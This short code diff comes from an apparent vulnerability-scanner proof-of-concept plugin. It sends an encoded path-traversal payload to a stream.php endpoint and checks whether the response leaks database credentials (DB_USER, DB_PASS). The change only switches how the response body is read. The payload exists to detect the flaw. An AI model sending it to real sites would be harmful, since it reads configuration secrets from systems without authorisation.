@@ -49,7 +49,7 @@ class Poc(ABPoc):
             payload = "/stream.php?file=TGk0dmRtbGlaVjlqYjI1bWFXY3VjR2h3UUVCdFpXUnBZUT09"
             r = requests.get(self.target + payload)
 
-            if r.status_code == 200 and "DB_USER" in r.content and "DB_PASS" in r.content:
+            if r.status_code == 200 and "DB_USER" in r.text and "DB_PASS" in r.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
